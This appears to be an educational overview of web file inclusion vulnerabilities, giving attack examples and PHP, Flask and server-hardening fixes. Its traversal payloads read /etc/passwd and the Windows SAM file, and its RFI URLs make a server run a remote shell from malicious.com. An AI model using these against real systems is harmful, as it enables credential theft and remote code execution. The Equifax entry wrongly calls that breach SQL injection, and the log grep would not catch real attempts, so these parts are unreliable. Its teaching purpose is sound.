# File Inclusion Overview

## File Inclusion – Overview

***

### Introduction to File Inclusion

File Inclusion vulnerabilities occur when applications improperly handle user input to include files dynamically. This can lead to severe consequences such as information disclosure, remote code execution, or privilege escalation. These vulnerabilities arise due to poor input validation, lack of access controls, and improper path handling.

#### Categories of File Inclusion Vulnerabilities

1. **Local File Inclusion (LFI)** – Including files already present on the server.
2. **Remote File Inclusion (RFI)** – Including files from external sources via URLs.
3. **Path Traversal** – Accessing files outside the intended directory by manipulating paths.

***

### Definition Bank

| **Term**                        | **Definition**                                                                          |
| ------------------------------- | --------------------------------------------------------------------------------------- |
| **Local File Inclusion (LFI)**  | A vulnerability where attackers include and access local server files.                  |
| **Remote File Inclusion (RFI)** | A vulnerability where attackers include files from external sources.                    |
| **Path Traversal**              | Manipulating file paths to access files outside restricted directories.                 |
| **Absolute Path**               | A full file path that uniquely identifies a file, independent of the working directory. |
| **Sandboxing**                  | Restricting file access to a designated directory to prevent unauthorized access.       |

***

### How File Inclusion Vulnerabilities Occur

#### 1. **Improper Input Validation**

* **Problem:** The application constructs file paths using user input without sanitization.
* **Effect:** Attackers manipulate the input to include unintended files.

#### 2. **Lack of Access Controls**

* **Problem:** No restrictions on directories or file access permissions.
* **Effect:** Attackers gain unauthorized access to sensitive files such as credentials or system configurations.

***

### Categories of File Inclusion Attacks

#### **1. Local File Inclusion (LFI)**

LFI allows attackers to include and access files already present on the server.

**Impact:**

* **Information Disclosure** – Reading sensitive files such as `/etc/passwd`.
* **Server-Side Code Execution** – Executing malicious payloads stored in server logs or temp files.
* **Privilege Escalation** – Gaining administrative access by loading configuration files.

**Example Payload:**

```plaintext
http://example.com/index.php?file=../../../../etc/passwd
```

***

#### **2. Remote File Inclusion (RFI)**

RFI allows attackers to include and execute files from external sources via URLs.

**Impact:**

* **Remote Code Execution** – Running attacker-hosted scripts on the server.
* **Data Theft** – Exfiltrating sensitive application data.

**Example Payload:**

```plaintext
http://example.com/index.php?file=http://malicious.com/shell.php
```

***

#### **3. Path Traversal**

Path traversal allows attackers to access files outside the intended directory by manipulating paths.

**Impact:**

* **Information Disclosure** – Reading files like `config.php` or `/etc/passwd`.
* **Access Control Bypass** – Navigating outside restricted directories.

**Example Payloads:**

```plaintext
../../../../etc/passwd
..\\..\\..\\..\\windows\\system32\\config\\SAM
```

***

### **Real-World File Inclusion Incidents**

#### **1. Equifax Data Breach (2017)**

* **Attack Vector:** While primarily an SQL injection vulnerability, improper input validation and access control weaknesses contributed to the breach.
* **Impact:** Over 147 million personal records, including Social Security numbers, were stolen.
* **Lesson Learned:** Secure coding practices and regular vulnerability scanning are critical.
* **Source:** [U.S. Government Accountability Office Report](https://www.gao.gov/products/gao-18-559)

***

#### **2. CVE-2019-18952 (Webmin RFI Vulnerability)**

* **Attack Vector:** Webmin contained a remote file inclusion vulnerability that allowed attackers to execute arbitrary commands by injecting malicious URLs.
* **Impact:** Exploited by attackers to gain remote access to Webmin servers.
* **Lesson Learned:** Disabling remote file inclusion and applying access controls are essential.
* **Source:** [NIST NVD CVE-2019-18952](https://nvd.nist.gov/vuln/detail/CVE-2019-18952)

***

#### **3. WordPress Plugins with LFI/RFI Vulnerabilities**

* **Attack Vector:** Many WordPress plugins implement file inclusion improperly, leading to LFI/RFI vulnerabilities.
* **Impact:** Attackers gain unauthorized access, execute arbitrary scripts, or extract sensitive data.
* **Lesson Learned:** Plugin developers must enforce strict input validation and restrict file inclusion.
* **Source:** [Wordfence Security Reports](https://www.wordfence.com/)

***

### **Attack Scenarios**

#### **Local File Inclusion (LFI) Example**

**Attack URL:**

```plaintext
http://example.com/index.php?page=../../../../etc/passwd
```

**Explanation:**

* The application does not properly validate user input, allowing traversal outside the intended directory.
* If successful, the attacker retrieves system files, exposing credentials and configuration details.

***

#### **Remote File Inclusion (RFI) Example**

**Attack URL:**

```plaintext
http://example.com/index.php?page=http://malicious.com/shell.txt
```

**Explanation:**

* The attacker provides a URL pointing to a malicious script.
* The application includes and executes the external file, leading to remote code execution.

***

### **Remediation Strategies**

#### **1. Input Validation & Sanitization**

* Restrict input to expected file names and extensions.
* Use **allowlists** rather than blocklists to enforce safe inputs.

**Secure Example (PHP)**

```php
$allowed_files = ['home.php', 'about.php'];
$file = $_GET['file'];

if (!in_array($file, $allowed_files)) {
    die('Invalid file request');
}

include $file;
```

***

#### **2. Enforce Secure File Handling**

* Use **absolute paths** instead of relying on user input.
* Restrict file inclusion to specific directories using **sandboxing** techniques.

**Secure Example (Python Flask)**

```python
import os

ALLOWED_FILES = {'index.html', 'about.html'}
filename = request.args.get('file', '')

if filename not in ALLOWED_FILES:
    abort(403)

with open(os.path.join('/var/www/templates', filename)) as f:
    content = f.read()
```

***

#### **3. Disable Remote File Inclusion**

* If RFI is not required, disable functions that allow URL-based inclusion.

**Example (PHP Configuration – disable RFI):**

```ini
allow_url_include = Off
allow_url_fopen = Off
```

***

#### **4. Monitor and Log Access Attempts**

* Implement logging and alerting mechanisms to detect unusual file access patterns.
* Regularly audit logs for suspicious inclusion attempts.

**Example (Linux File Access Logs):**

```bash
grep "file inclusion" /var/log/apache2/access.log
```

***

#### **5. Apply the Principle of Least Privilege**

* Limit file permissions to prevent unauthorized read or execution access.
* Ensure web application users have minimal access rights.

**Example (Linux File Permissions):**

```bash
chmod -R 750 /var/www/html
chown -R www-data:www-data /var/www/html
```

***

### **Final Thoughts**

File Inclusion vulnerabilities pose a significant threat to web applications, often leading to sensitive data disclosure or full system compromise.

#### **Key Takeaways:**

1. **Strict Input Validation** – Restrict user input to prevent unintended file inclusions.
2. **Access Controls** – Restrict directory and file access to authorized users.
3. **Disable RFI Features** – Prevent remote file inclusion when not necessary.
4. **Logging & Monitoring** – Continuously monitor file inclusion requests for anomalies.

By following secure coding practices, implementing strong access controls, and conducting regular security assessments, organizations can effectively mitigate File Inclusion vulnerabilities.

***

### **Further Reading & References**

[OWASP File Inclusion Guide](https://owasp.org/www-community/vulnerabilities/Remote_File_Inclusion)\
[PortSwigger File Inclusion Labs](https://portswigger.net/web-security/file-path-traversal)\
[NIST Secure Software Development Framework](https://csrc.nist.gov/publications/detail/sp/800-218/final)
